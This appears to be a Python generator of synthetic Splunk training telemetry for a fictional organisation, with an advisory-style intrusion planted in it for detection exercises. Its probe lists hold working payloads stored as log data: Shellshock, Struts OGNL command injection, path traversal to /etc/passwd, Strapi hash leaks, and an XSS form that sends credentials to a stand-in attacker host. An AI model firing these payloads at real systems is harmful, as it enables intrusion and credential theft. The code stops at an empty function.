#!/usr/bin/env python3
"""Synthetic lab data for "From Advisory to Detection: Hunting Integrity Tech (AA26-281A) in Splunk".

Generates three weeks of background telemetry for a fictional organisation (lab.example) with the
AA26-281A-style intrusion planted inside it, so every search in the deck returns the result shown
on the slides. Nothing here touches a real system: hosts, users and addresses are fictional
(192.0.2.0/24, 198.51.100.0/24 and 203.0.113.0/24 are reserved for documentation).

Outputs:
  TA-aa26-281a-lab/data/...           log files in the formats the Splunk add-ons expect
  TA-aa26-281a-lab/default/inputs.conf        monitors those files with the right index, sourcetype and source
  TA-aa26-281a-lab/default/savedsearches.conf every demo search, pinned to the scenario window
  dist/TA-aa26-281a-lab.tgz           the app, ready for Apps > Install app from file
  DEMO_SEARCHES.md                    every SPL search in demo order with its expected result
  output/seed_risk.spl                one search per detection that writes its findings to index=risk
  output/manifest.json, expected.json used by labctl.py

Usage:
  python3 generate_lab_data.py                      # defaults: Day 0 = Mon 28 Sep 2026, hunt 8 Oct 09:00
  python3 generate_lab_data.py --day0 2026-11-09 --hunt 2026-11-19T09:00
"""

import argparse
import csv
import datetime as dt
import fnmatch
import hashlib
import json
import random
import re
import shutil
import statistics
import tarfile
import uuid
from collections import Counter, defaultdict
from pathlib import Path
from xml.sax.saxutils import escape
from zoneinfo import ZoneInfo

HERE = Path(__file__).resolve().parent
APP = HERE / "TA-aa26-281a-lab"
UTC = dt.timezone.utc

DOMAIN = "lab.example"
NETBIOS = "LAB"
ATTACKER_SCAN = "203.0.113.47"
ATTACKER_COLLECT = "203.0.113.52"
SOFTETHER_SERVER = "203.0.113.88"
SOFTETHER_DDNS = "vpn583920174.softether.net"
STAGE_C2 = "update.diagtrack-cloud.example"
MOBILE_GW = "198.51.100.20"
NET_SCANNER = "198.51.100.77"
VULN_SCANNER = "10.20.0.50"
MAIL_PUBLIC, MAIL_PRIVATE = "192.0.2.25", "10.20.1.20"
WEB_PUBLIC, WEB_PRIVATE = "192.0.2.30", "10.20.1.30"
CRM_IP = "10.20.1.40"
DC_IP = "10.20.0.10"
VICTIM = "j.citizen"
VICTIM_WS = "WS-0417"
VICTIM_IP = "10.20.4.17"
# FishHub (DOJ seizure warrant, W.D. Pa., 8 Oct 2026): the stager pulls a .txt from fym.<seized domain> into %temp% as .vbe,
# then the follow-on code lists files, compresses documents and uploads them to 207.148.92.220.
FISH_INDEX = 57
FISH_USER = "a.lim"
FISH_WS = f"WS-{401 + FISH_INDEX:04d}"
FISH_IP = f"10.20.4.{FISH_INDEX + 1}"
FISHHUB_HOST = "fym.linkedinns.net"
FISHHUB_DL = "203.0.113.101"
FISHHUB_EXFIL = "207.148.92.220"
FISHHUB_STEM = "shnmpmbxwylismvb"
LEGIT_VPN_INDEX = 3
LEGIT_VPN_SEED = 4402
EXPLOIT_SEED = 5507
SHELLSHOCK_UA = "() { _; } >_[$($())] { echo; echo; /bin/id; }"
PROBE_UA = "python-requests/2.31.0"
SCANNER_UA = "lab-vulnerability-scanner/10.7 (authorised; VULN01)"
# AA26-281A Appendix B, Table 16: CVEs the actors successfully exploited. kev = newly added to CISA KEV with the advisory.
ADVISORY_CVES = [("CVE-2014-6278", 2014, "GNU Bash", "OS command injection (Shellshock variant)", "Remote code execution", "no"),
                 ("CVE-2015-3306", 2015, "ProFTPD 1.3.5", "Improper access control (mod_copy)", "Unauthorised read", "yes"),
                 ("CVE-2015-5477", 2015, "ISC BIND 9", "Data processing error (TKEY)", "Denial of service", "yes"),
                 ("CVE-2016-3081", 2016, "Apache Struts 2", "Command injection (dynamic method invocation)", "Remote code execution", "yes"),
                 ("CVE-2019-11510", 2019, "Pulse Connect Secure", "Path traversal", "Unauthorised read", "no"),
                 ("CVE-2021-22205", 2021, "GitLab", "Code injection (ExifTool)", "Remote code execution", "no"),
                 ("CVE-2021-3199", 2021, "ONLYOFFICE DocumentServer", "Path traversal", "Unauthorised write", "yes"),
                 ("CVE-2023-22894", 2023, "Strapi", "Cleartext storage of sensitive information", "Information disclosure", "yes")]
# (method, stem, query, user agent or None for PROBE_UA, status): what each attempt looks like in a web server log
ACTOR_PROBES = [
    ("GET", "/cgi-bin/test.cgi", "-", SHELLSHOCK_UA, 404), ("GET", "/cgi-bin/status", "-", SHELLSHOCK_UA, 404),
    ("GET", "/cgi-bin/admin.cgi", "-", SHELLSHOCK_UA, 404),
    ("GET", "/index.action", "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.getWriter().print(%23parameters.cmd[0]),%23res.getWriter().close&cmd=id", None, 404),
    ("GET", "/login.action", "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0])&cmd=whoami", None, 404),
    ("GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd", "/dana/html5acc/guacamole/", None, 400),
    ("GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb", "/dana/html5acc/guacamole/", None, 400),
    ("POST", "/uploads/user", "-", None, 404),
    ("GET", "/web-apps/apps/api/documents/api.js", "-", None, 404),
    ("POST", "/FileUploader.ashx", "filename=..%2f..%2f..%2finetpub%2fwwwroot%2fhealth.aspx", None, 404),
    ("GET", "/admin/users", "filters[$and][0][password][$startsWith]=$2a$10$", None, 404),
    ("GET", "/admin/users", "filters[$and][0][email][$startsWith]=a&filters[$and][1][password][$startsWith]=$2a$", None, 404),
    ("GET", "/search.aspx", "q=%22%3E%3Cscript%3Edocument.body.innerHTML%3D%27%3Cform%20action%3D%2F%2F203.0.113.47%2Fl%3E%3Cinput%20name%3Du%3E%3Cinput%20name%3Dp%20type%3Dpassword%3E%27%3C%2Fscript%3E", None, 200),
    ("GET", "/contact.aspx", "name=%3Csvg%2Fonload%3Dalert(document.domain)%3E", None, 200),
    ("GET", "/news/index.aspx", "id=1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", None, 500),
]
SCANNER_PROBES = [("GET", "/cgi-bin/test.cgi", "-", SHELLSHOCK_UA, 404),
                  ("GET", "/index.action", "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&cmd=echo", None, 404),
                  ("GET", "/admin/users", "filters[$and][0][password][$startsWith]=$2a$", None, 404),
                  ("GET", "/search.aspx", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", None, 200)]
ROGUE_APP_ID = "5c1e7a42-93d8-4f0b-b2a6-0e4d8f17c3a9"
ROGUE_APP_NAME = "Project Mail Archiver"
BACKUP_APP_ID = "8a2f9c11-4e7d-4b6a-9c3e-71d2b5f0a648"
OFFICE_APP_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
OUTLOOK_MOBILE_APP_ID = "27922004-5251-4030-b22d-91ecd9a37ea4"
TENANT_ID = "7d1b3c55-2f0e-4a8b-9d61-3c5e8f2a9b14"

FIRST = ["Jane", "Liam", "Olivia", "Noah", "Ava", "Jack", "Mia", "William", "Charlotte", "Thomas",
         "Amelia", "James", "Isla", "Lucas", "Grace", "Henry", "Chloe", "Oliver", "Zoe", "Ethan",
         "Ruby", "Leo", "Sophie", "Max", "Ella", "Samuel", "Harper", "Daniel", "Lily", "Ryan"]
LAST = ["Nguyen", "Smith", "Williams", "Brown", "Wilson", "Taylor", "Anderson", "Martin", "Okafor",
        "Thompson", "Walker", "White", "Patel", "Harris", "Kelly", "Singh", "Chen", "Robinson",
        "Ward", "Murphy", "Clarke", "Hughes", "Lee", "Evans", "Kumar", "Wright", "Roberts", "Young"]

OUTLOOK_UA = "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)"
OWA_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0"
IOS_UA = ["Apple-iPhone15C2/2201.80", "Apple-iPhone16C1/2201.80", "Outlook-iOS/2.0"]
SPRAY_IFACES = [("/EWS/Exchange.asmx", "POST", "ExchangeServicesClient/15.00.0913.015"),
                ("/Microsoft-Server-ActiveSync/default.eas", "POST", "Android-Mail/2023.12.17"),
                ("/autodiscover/autodiscover.xml", "POST", "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.4266; Pro)"),
                ("/mapi/emsmdb/", "POST", "MapiHttpClient")]
SAAS_POOL = [f"{a}.{b}.{c}.{d}" for a, b, c, d in [
    (13, 107, 6, 152), (13, 107, 18, 10), (20, 190, 151, 6), (52, 96, 88, 162), (40, 99, 10, 2),
    (142, 250, 66, 78), (142, 250, 70, 206), (172, 217, 24, 46), (151, 101, 2, 133), (151, 101, 66, 133),
    (104, 18, 32, 7), (104, 18, 33, 7), (99, 86, 33, 112), (54, 230, 41, 18), (3, 105, 196, 40),
    (23, 32, 236, 81), (23, 215, 0, 136), (184, 28, 90, 27), (52, 112, 95, 79), (20, 42, 65, 92),
    (13, 69, 239, 72), (204, 79, 197, 200), (52, 109, 12, 6), (34, 107, 243, 93), (35, 186, 224, 25),
    (185, 199, 108, 153), (140, 82, 112, 3), (162, 159, 136, 232), (162, 159, 140, 245), (17, 253, 144, 10)]]
DNS_POOL = ["outlook.office365.com", "login.microsoftonline.com", "teams.microsoft.com", "www.google.com",
            "graph.microsoft.com", "ctldl.windowsupdate.com", "www.bing.com", "fonts.gstatic.com",
            "www.abc.net.au", "www.bom.gov.au", "www.cyber.gov.au", "github.com", "slack.com",
            "settings-win.data.microsoft.com", "ocsp.digicert.com", "update.googleapis.com",
            "edge.microsoft.com", "wpad.lab.example", "mail.lab.example", "intranet.lab.example"]
WEB_PAGES = ["/", "/index.aspx", "/about.aspx", "/contact.aspx", "/news/index.aspx", "/careers.aspx",
             "/css/site.css", "/js/site.js", "/images/logo.png", "/news/2026-09-update.aspx"]
DIRSEARCH_WORDS = ["admin", "login", "backup", "config", "test", "upload", "uploads", "shell", "db", "phpinfo",
                   "info", "install", "setup", "wp-login", "xmlrpc", "manager", "console", "portal", "user",
                   "users", "account", "api", "debug", "old", "new", "dev", "staging", "temp", "tmp", "data",
                   "export", "import", "file", "files", "download", "server", "status", "web", "default",
                   "home", "main", "panel", "cpanel", "phpmyadmin", "sql", "database", "auth", "register",
                   "reset", "password", "secure", "private", "public", "app", "service", "services", "cgi",
                   "ajax", "rpc", "proxy", "redirect", "search", "edit", "update", "remote", "access"]

SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
SECURITY_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
SCM_GUID = "{555908d1-a6d7-4695-8e1e-26931d2012f4}"


class Lab:
    def __init__(self, day0, hunt, tz, seed):
        self.tz = ZoneInfo(tz)
        self.day0 = day0
        self.start = dt.datetime.combine(day0 - dt.timedelta(days=14), dt.time(0, 0), self.tz)
        self.end = hunt.replace(tzinfo=self.tz)
        self.rng = random.Random(seed)
        self.iis = {"MAIL01": [], "WEB01": []}
        self.iis_extra = {"MAIL01": [], "WEB01": []}   # added in v3; written to separate files like win_extra
        self.iis_sink = self.iis
        self.fw, self.dns, self.o365 = [], [], []
        self.win = defaultdict(list)          # (channel, host) -> [(t, xml, record)]
        self.win_extra = defaultdict(list)    # added in v2; written to separate files so the v1 files stay byte-identical
        self.win_sink = self.win
        self.records = defaultdict(list)      # structured copies for expected-result checks
        self.record_ids = Counter()
        self.risk = []
        self._build_org()

    # ------------------------------------------------------------------ time helpers
    def at(self, day, hh, mm=0, ss=0.0):
        d = self.day0 + dt.timedelta(days=day)
        local = dt.datetime(d.year, d.month, d.day, hh, mm, tzinfo=self.tz)
        return local.astimezone(UTC) + dt.timedelta(seconds=ss)

    def days(self):
        d = self.start.date()
        while d <= self.end.date():
            yield (d - self.day0).days, d
            d += dt.timedelta(days=1)

    def in_window(self, t):
        return self.start.astimezone(UTC) <= t < self.end.astimezone(UTC)

    def jitter(self, t, seconds):
        return t + dt.timedelta(seconds=self.rng.uniform(0, seconds))

    # ------------------------------------------------------------------ organisation
    def _build_org(self):
        rng = self.rng
        names, seen = [], set()
        while len(names) < 120:
            f, l = rng.choice(FIRST), rng.choice(LAST)
            sam = f"{f[0].lower()}.{l.lower()}"
            if sam in seen or sam == VICTIM:
                continue
            seen.add(sam)
            names.append((sam, f"{f} {l}"))
        names[16] = (VICTIM, "Jane Citizen")
        names[FISH_INDEX] = (FISH_USER, "Alex Lim")
        self.users = []
        for i, (sam, display) in enumerate(names):
            self.users.append({"sam": sam, "display": display, "upn": f"{sam}@{DOMAIN}",
                               "ws": f"WS-{401 + i:04d}", "ip": f"10.20.4.{i + 1}",
                               "sid": f"S-1-5-21-3623811015-3361044348-30300820-{1104 + i}",
                               "home": f"198.51.100.{100 + i}" if i < 120 else None,
                               "mobile": rng.random() < 0.45 or sam == VICTIM,
                               "remote_days": rng.random() * 0.25})
        self.by_sam = {u["sam"]: u for u in self.users}
        self.stale_phone = next(u for u in self.users if u["mobile"] and u["sam"] != VICTIM)
        others = [u for u in self.users if u["sam"] != VICTIM]
        self.audited = [self.by_sam[VICTIM]] + rng.sample(others, 29)
        self.servers = {"DC01": DC_IP, "DC02": "10.20.0.11", "MAIL01": MAIL_PRIVATE, "WEB01": WEB_PRIVATE,
                        "CRM01": CRM_IP, "FS01": "10.20.1.50", "VULN01": VULN_SCANNER}
        self.public_hosts = sorted({MAIL_PUBLIC, WEB_PUBLIC} | {f"192.0.2.{n}" for n in rng.sample(range(2, 250), 60)},
                                   key=lambda s: int(s.split(".")[-1]))
        self.saas = {u["ip"]: rng.sample(SAAS_POOL, 12) for u in self.users}

    # ------------------------------------------------------------------ writers
    def iis_line(self, server, t, method, stem, user, c_ip, ua, status, query="-", sub=0, win32=0, port=443):
        if not self.in_window(t):
            return
        s_ip = MAIL_PRIVATE if server == "MAIL01" else WEB_PRIVATE
        rec = {"t": t, "s_ip": s_ip, "cs_method": method, "cs_uri_stem": stem, "cs_uri_query": query,
               "s_port": port, "cs_username": user or "-", "c_ip": c_ip, "cs_User_Agent": ua.replace(" ", "+"),
               "sc_status": status, "sc_substatus": sub, "sc_win32_status": win32,
               "time_taken": self.rng.randint(15, 900)}
        self.iis_sink[server].append(rec)

    def fw_flow(self, t, src, dest, dest_port, action="allowed", bytes_in=None, bytes_out=None, dvc="fw-edge01",
                transport="tcp", duration=None, app=None):
        if not self.in_window(t):
            return
        if bytes_in is None:
            bytes_in = 0 if action == "blocked" else self.rng.randint(4_000, 400_000)
        if bytes_out is None:
            bytes_out = 60 if action == "blocked" else self.rng.randint(800, 30_000)
        self.fw.append({"t": t, "dvc": dvc, "action": action, "transport": transport, "src": src,
                        "src_port": self.rng.randint(49152, 65535), "dest": dest, "dest_port": dest_port,
                        "bytes_in": bytes_in, "bytes_out": bytes_out,
                        "duration": duration if duration is not None else (0 if action == "blocked" else self.rng.randint(1, 120)),
                        "app": app or {21: "ftp", 22: "ssh", 53: "dns", 80: "web-browsing", 443: "ssl",
                                       445: "smb", 1080: "socks", 3389: "rdp"}.get(dest_port, "unknown"),
                        "rule": "deny-inbound" if action == "blocked" else "allow"})

    def dns_query(self, t, src, query, answer, record_type="A", reply="NOERROR"):
        if not self.in_window(t):
            return
        self.dns.append({"t": t, "dvc": "DC01", "src": src, "dest": DC_IP, "query": query,
                         "record_type": record_type, "reply_code": reply, "answer": answer,
                         "message_type": "Response"})

    def win_event(self, channel, host, t, eid, data, user_sid=None):
        if not self.in_window(t):
            return
        self.record_ids[(channel, host)] += 1
        rid = 100000 + self.record_ids[(channel, host)]
        computer = f"{host}.{DOMAIN}"
        st = t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond:06d}0Z"
        if channel == "Sysmon":
            sysblk = (f"<Provider Name='Microsoft-Windows-Sysmon' Guid='{SYSMON_GUID}'/><EventID>{eid}</EventID>"
                      f"<Version>5</Version><Level>4</Level><Task>{eid}</Task><Opcode>0</Opcode>"
                      f"<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='{st}'/>"
                      f"<EventRecordID>{rid}</EventRecordID><Correlation/><Execution ProcessID='3160' ThreadID='4412'/>"
                      f"<Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>{computer}</Computer>"
                      f"<Security UserID='S-1-5-18'/>")
        elif channel == "Security":
            task = {4624: 12544, 4625: 12544, 4771: 14339}.get(eid, 12544)
            kw = "0x8010000000000000" if eid in (4625, 4771) else "0x8020000000000000"
            sysblk = (f"<Provider Name='Microsoft-Windows-Security-Auditing' Guid='{SECURITY_GUID}'/>"
                      f"<EventID>{eid}</EventID><Version>0</Version><Level>0</Level><Task>{task}</Task><Opcode>0</Opcode>"
                      f"<Keywords>{kw}</Keywords><TimeCreated SystemTime='{st}'/><EventRecordID>{rid}</EventRecordID>"
                      f"<Correlation/><Execution ProcessID='652' ThreadID='{self.rng.randint(700, 9000)}'/>"
                      f"<Channel>Security</Channel><Computer>{computer}</Computer><Security/>")
        else:
            sysblk = (f"<Provider Name='Service Control Manager' Guid='{SCM_GUID}' EventSourceName='Service Control Manager'/>"
                      f"<EventID Qualifiers='16384'>{eid}</EventID><Version>0</Version><Level>4</Level><Task>0</Task>"
                      f"<Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='{st}'/>"
                      f"<EventRecordID>{rid}</EventRecordID><Correlation/><Execution ProcessID='780' ThreadID='{self.rng.randint(700, 9000)}'/>"
                      f"<Channel>System</Channel><Computer>{computer}</Computer><Security UserID='{user_sid or 'S-1-5-18'}'/>")
        body = "".join(f"<Data Name='{k}'>{escape(str(v), {chr(39): '&apos;'})}</Data>" for k, v in data.items())
        xml = f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>{sysblk}</System><EventData>{body}</EventData></Event>"
        self.win_sink[(channel, host)].append((t, xml))
        self.records[channel].append({"t": t, "host": host, "eid": eid, **data})

    def proc_guid(self):
        return "{" + str(uuid.UUID(int=self.rng.getrandbits(128))) + "}"

    def sysmon_proc(self, host, t, image, cmd, user, parent_image, parent_cmd, original, company="Microsoft Corporation",
                    description="", product="Microsoft® Windows® Operating System", integrity="Medium", pid=None):
        h = hashlib.sha256(f"{original}|{company}".encode()).hexdigest().upper()
        md5 = hashlib.md5(f"{original}|{company}".encode()).hexdigest().upper()
        pid = pid or self.rng.randint(1000, 15000)
        guid = self.proc_guid()
        self.win_event("Sysmon", host, t, 1, {
            "RuleName": "-", "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.") + f"{t.microsecond // 1000:03d}",
            "ProcessGuid": guid, "ProcessId": pid, "Image": image, "FileVersion": "10.0.19041.1", "Description": description or original,
            "Product": product, "Company": company, "OriginalFileName": original, "CommandLine": cmd,
            "CurrentDirectory": "C:\\Windows\\system32\\", "User": user, "LogonGuid": self.proc_guid(), "LogonId": "0x3e7",
            "TerminalSessionId": 1, "IntegrityLevel": integrity, "Hashes": f"MD5={md5},SHA256={h}",
            "ParentProcessGuid": self.proc_guid(), "ParentProcessId": self.rng.randint(500, 9000), "ParentImage": parent_image,
            "ParentCommandLine": parent_cmd, "ParentUser": user})
        return guid, pid

    def sysmon_file(self, host, t, image, target, user):
        self.win_event("Sysmon", host, t, 11, {
            "RuleName": "-", "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.") + f"{t.microsecond // 1000:03d}",
            "ProcessGuid": self.proc_guid(), "ProcessId": self.rng.randint(1000, 15000), "Image": image,
            "TargetFilename": target, "CreationUtcTime": t.strftime("%Y-%m-%d %H:%M:%S.") + f"{t.microsecond // 1000:03d}",
            "User": user})

    def o365_record(self, t, rec):
        if self.in_window(t):
            self.o365.append({"t": t, "CreationTime": t.strftime("%Y-%m-%dT%H:%M:%S"), "Id": str(uuid.UUID(int=self.rng.getrandbits(128))),
                              "OrganizationId": TENANT_ID, **rec})

    # ------------------------------------------------------------------ background
    def background(self):
        rng = self.rng
        for day, date in self.days():
            weekday = date.weekday() < 5
            for u in self.users:
                at_work = weekday and rng.random() > 0.06
                remote = at_work and rng.random() < u["remote_days"]
                c_ip = u["home"] if remote else u["ip"]
                if at_work:
                    start_h = rng.uniform(7.5, 9.2)
                    end_h = rng.uniform(16.3, 18.0)
                    t0 = self.at(day, int(start_h), int((start_h % 1) * 60))
                    if not remote:
                        self.win_event("Security", u["ws"], t0, 4624, self.logon_data(u, 2 if day % 3 else 11, u["ip"], u["ws"]))
                    self.iis_line("MAIL01", self.jitter(t0, 90), "POST", "/autodiscover/autodiscover.xml", u["sam"], c_ip, OUTLOOK_UA, 200)
                    h = start_h
                    while h < end_h:
                        t = self.at(day, int(h), int((h % 1) * 60), rng.uniform(0, 59))
                        self.iis_line("MAIL01", t, "POST", "/EWS/Exchange.asmx", u["sam"], c_ip, OUTLOOK_UA, 200)
                        self.iis_line("MAIL01", self.jitter(t, 400), "POST", "/mapi/emsmdb/", u["sam"], c_ip, OUTLOOK_UA, 200,
                                      query=f"MailboxId={uuid.uuid5(uuid.NAMESPACE_DNS, u['upn'])}@{DOMAIN}")
                        if not remote:
                            for dest in rng.sample(self.saas[u["ip"]], 1):
                                self.fw_flow(self.jitter(t, 900), u["ip"], dest, rng.choice([443, 443, 443, 80]))
                            self.dns_query(self.jitter(t, 900), u["ip"], rng.choice(DNS_POOL), rng.choice(SAAS_POOL))
                        else:
                            self.fw_flow(self.jitter(t, 30), c_ip, MAIL_PUBLIC, 443, bytes_in=rng.randint(2000, 9000),
                                         bytes_out=rng.randint(20000, 160000))
                        h += rng.uniform(0.28, 0.40)
                    if rng.random() < 0.03:
                        tt = self.at(day, 10, rng.randint(0, 59))
                        self.iis_line("MAIL01", tt, "POST", "/owa/auth.owa", u["sam"], c_ip, OWA_UA, 401, sub=1, win32=1326)
                        self.win_event("Security", "MAIL01", tt, 4625, self.fail_data(u["sam"], c_ip))
                        self.iis_line("MAIL01", tt + dt.timedelta(seconds=20), "POST", "/owa/auth.owa", u["sam"], c_ip, OWA_UA, 200)
                    if rng.random() < 0.02 and not remote:
                        self.win_event("Security", "DC01", self.at(day, 9, rng.randint(0, 59)), 4771, {
                            "TargetUserName": u["sam"], "TargetSid": u["sid"], "ServiceName": f"krbtgt/{NETBIOS}",
                            "TicketOptions": "0x40810010", "Status": "0x18", "PreAuthType": "2",
                            "IpAddress": f"::ffff:{u['ip']}", "IpPort": rng.randint(49152, 65535),
                            "CertIssuerName": "", "CertSerialNumber": "", "CertThumbprint": ""})
                    if not remote:
                        self.workstation_processes(u, day, start_h, end_h)
                if u["mobile"]:
                    h = 7.0 + rng.random()
                    while h < 22.0:
                        t = self.at(day, int(h), int((h % 1) * 60), rng.uniform(0, 59))
                        if u is self.stale_phone and 2 <= day <= 4:
                            self.iis_line("MAIL01", t, "POST", "/Microsoft-Server-ActiveSync/default.eas", u["sam"], MOBILE_GW,
                                          IOS_UA[0], 401, sub=1, win32=1326, query=f"Cmd=Sync&User={u['sam']}&DeviceType=iPhone")
                            self.win_event("Security", "MAIL01", t, 4625, self.fail_data(u["sam"], MOBILE_GW))
                        else:
                            self.iis_line("MAIL01", t, "POST", "/Microsoft-Server-ActiveSync/default.eas", u["sam"], MOBILE_GW,
                                          IOS_UA[int(u["sid"][-4:]) % 3], 200, query=f"Cmd=Ping&User={u['sam']}&DeviceType=iPhone")
                        h += rng.uniform(0.45, 0.6)
            # integration account: steady, high, and never 500 an hour
            for hh in range(24):
                n = rng.randint(140, 190)
                for k in range(n):
                    self.iis_line("MAIL01", self.at(day, hh, 0, k * 3600 / n), "POST", "/EWS/Exchange.asmx", "svc-crm",
                                  CRM_IP, "CRMConnector/4.2 ExchangeServicesClient/15.00.0913.015", 200)
            self.web_background(day)
            for srv in ("DC01", "DC02", "MAIL01", "WEB01", "CRM01", "FS01"):
                for k in range(rng.randint(4, 8)):
                    t = self.at(day, rng.randint(0, 23), rng.randint(0, 59), rng.uniform(0, 59))
                    img, orig = rng.choice([("C:\\Windows\\System32\\svchost.exe", "svchost.exe"),
                                            ("C:\\Windows\\System32\\conhost.exe", "CONHOST.EXE"),
                                            ("C:\\Windows\\System32\\dllhost.exe", "dllhost.exe"),
                                            ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe")])
                    self.sysmon_proc(srv, t, img, img, "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\services.exe",
                                     "C:\\Windows\\system32\\services.exe", orig, integrity="System")
            if date.weekday() == 6:
                self.internal_scan(day)
            if day in (-9, 5):
                self.internet_scan(day)
        self.service_noise()
        self.o365_background()
        self.web_server_files()

    def logon_data(self, u, logon_type, ip, ws):
        return {"SubjectUserSid": "S-1-5-18", "SubjectUserName": f"{ws}$", "SubjectDomainName": NETBIOS,
                "SubjectLogonId": "0x3e7", "TargetUserSid": u["sid"], "TargetUserName": u["sam"],
                "TargetDomainName": NETBIOS, "TargetLogonId": hex(self.rng.randint(0x100000, 0xffffff)),
                "LogonType": logon_type, "LogonProcessName": "User32", "AuthenticationPackageName": "Negotiate",
                "WorkstationName": ws, "LogonGuid": self.proc_guid(), "TransmittedServices": "-", "LmPackageName": "-",
                "KeyLength": 0, "ProcessId": "0x2f4", "ProcessName": "C:\\Windows\\System32\\svchost.exe",
                "IpAddress": "127.0.0.1" if logon_type in (2, 11) else ip, "IpPort": 0,
                "ImpersonationLevel": "%%1833", "ElevatedToken": "%%1843"}

    def fail_data(self, sam, ip):
        return {"SubjectUserSid": "S-1-5-18", "SubjectUserName": "MAIL01$", "SubjectDomainName": NETBIOS,
                "SubjectLogonId": "0x3e7", "TargetUserSid": "S-1-0-0", "TargetUserName": sam, "TargetDomainName": NETBIOS,
                "Status": "0xc000006d", "FailureReason": "%%2313", "SubStatus": "0xc000006a", "LogonType": 8,
                "LogonProcessName": "Advapi  ", "AuthenticationPackageName": "Negotiate", "WorkstationName": "MAIL01",
                "TransmittedServices": "-", "LmPackageName": "-", "KeyLength": 0, "ProcessId": "0x1a2c",
                "ProcessName": "C:\\Windows\\System32\\inetsrv\\w3wp.exe", "IpAddress": ip,
                "IpPort": self.rng.randint(1024, 65535)}

    def workstation_processes(self, u, day, start_h, end_h):
        rng = self.rng
        user = f"{NETBIOS}\\{u['sam']}"
        apps = [("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "Outlook.exe", "Microsoft Outlook", "Microsoft Office"),
                ("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "msedge.exe", "Microsoft Edge", "Microsoft Edge"),
                ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "WinWord.exe", "Microsoft Word", "Microsoft Office"),
                ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "Excel.exe", "Microsoft Excel", "Microsoft Office"),
                (f"C:\\Users\\{u['sam']}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", "Teams.exe", "Microsoft Teams", "Microsoft Teams")]
        for img, orig, desc, prod in rng.sample(apps, 3):
            t = self.at(day, int(start_h), int((start_h % 1) * 60), rng.uniform(60, 1500))
            self.sysmon_proc(u["ws"], t, img, f'"{img}"', user, "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE",
                             orig, description=desc, product=prod)
        for _ in range(rng.randint(2, 4)):
            h = rng.uniform(start_h, end_h)
            t = self.at(day, int(h), int((h % 1) * 60), rng.uniform(0, 59))
            kind = rng.random()
            if kind < 0.4:
                self.sysmon_proc(u["ws"], t, "C:\\Windows\\System32\\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
                                 user, "C:\\Windows\\System32\\cmd.exe", "\"C:\\Windows\\system32\\cmd.exe\"", "CONHOST.EXE",
                                 description="Console Window Host")
            elif kind < 0.75:
                self.sysmon_proc(u["ws"], t, "C:\\Windows\\System32\\dllhost.exe",
                                 "C:\\Windows\\system32\\DllHost.exe /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}",
                                 user, "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
                                 "dllhost.exe", description="COM Surrogate")
            else:
                f = rng.choice(["Report", "Minutes", "Brief", "Roster", "Budget"])
                self.sysmon_file(u["ws"], t, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                                 f"C:\\Users\\{u['sam']}\\Downloads\\{f}_{rng.randint(100, 999)}.pdf", user)

    def web_background(self, day):
        rng = self.rng
        for _ in range(rng.randint(120, 200)):
            ip = f"198.51.100.{rng.randint(225, 254)}" if rng.random() < 0.3 else f"203.0.113.{rng.randint(120, 250)}"
            t = self.at(day, rng.randint(6, 22), rng.randint(0, 59), rng.uniform(0, 59))
            self.fw_flow(t, ip, WEB_PUBLIC, 443)
            for k, page in enumerate(rng.sample(WEB_PAGES, rng.randint(2, 5))):
                self.iis_line("WEB01", t + dt.timedelta(seconds=k * 4), "GET", page, None, ip, OWA_UA, 200)
            if rng.random() < 0.15:
                self.iis_line("WEB01", t + dt.timedelta(seconds=30), "GET", "/favicon.ico", None, ip, OWA_UA, 404, sub=0, win32=2)
        bot = f"203.0.113.{rng.randint(120, 250)}"
        tb = self.at(day, rng.randint(0, 23), rng.randint(0, 59))
        for k, p in enumerate(rng.sample(["/wp-login.php", "/xmlrpc.php", "/wp-admin/setup-config.php", "/.env", "/admin.php",
                                          "/phpmyadmin/index.php", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"], 5)):
            self.iis_line("WEB01", tb + dt.timedelta(seconds=k * 2), "GET", p, None, bot, "Mozilla/5.0 (compatible; scanner)", 404, win32=2)

    def internal_scan(self, day):
